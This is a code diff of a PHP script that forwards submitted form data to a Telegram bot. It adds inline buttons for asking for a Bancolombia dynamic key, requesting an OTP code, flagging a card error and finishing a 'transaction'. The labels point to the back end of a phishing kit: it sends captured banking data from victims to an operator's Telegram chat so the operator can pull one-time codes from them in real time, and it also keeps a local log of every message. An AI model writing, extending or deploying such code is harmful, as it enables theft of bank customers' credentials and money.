@@ -9,12 +9,47 @@ if (!isset($_POST['data'])) {
 
 $message = $_POST['data'];
 
-// URL para enviar a Telegram
-$url = "https://api.telegram.org/bot$botToken/sendMessage";
+// Reemplaza esto por tu lógica de ID único si lo usas
+$transactionId = time() . rand(100, 999);
 
-// Enviar
-$response = file_get_contents($url . "?chat_id=$chatId&text=" . urlencode($message));
+// Botones inline personalizados
+$keyboard = [
+    "inline_keyboard" => [
+        [
+            ["text" => "🔐 Pedir Dinámica - Bancolombia", "callback_data" => "pedir_dinamica:$transactionId"]
+        ],
+        [
+            ["text" => "📲 Pedir Código OTP", "callback_data" => "pedir_otp:$transactionId"]
+        ],
+        [
+            ["text" => "❌ Error de TC", "callback_data" => "error_tc:$transactionId"]
+        ],
+        [
+            ["text" => "⚠️ Error de Logo - Bancolombia", "callback_data" => "error_logo:$transactionId"]
+        ],
+        [
+            ["text" => "✅ Finalizar", "callback_data" => "confirm_finalizar:$transactionId"]
+        ]
+    ]
+];
 
-// Guardar respuesta para debug
-file_put_contents("debug.log", "\nRespuesta Telegram: $response\n", FILE_APPEND);
+// Armar payload
+$postFields = [
+    'chat_id' => $chatId,
+    'text' => $message,
+    'reply_markup' => json_encode($keyboard),
+    'parse_mode' => 'HTML'
+];
+
+// Enviar con cURL
+$ch = curl_init("https://api.telegram.org/bot$botToken/sendMessage");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$response = curl_exec($ch);
+curl_close($ch);
+
+// Log para revisar si algo falla
+file_put_contents("debug.log", "Enviado: $message\nRespuesta: $response\n", FILE_APPEND);
 ?>
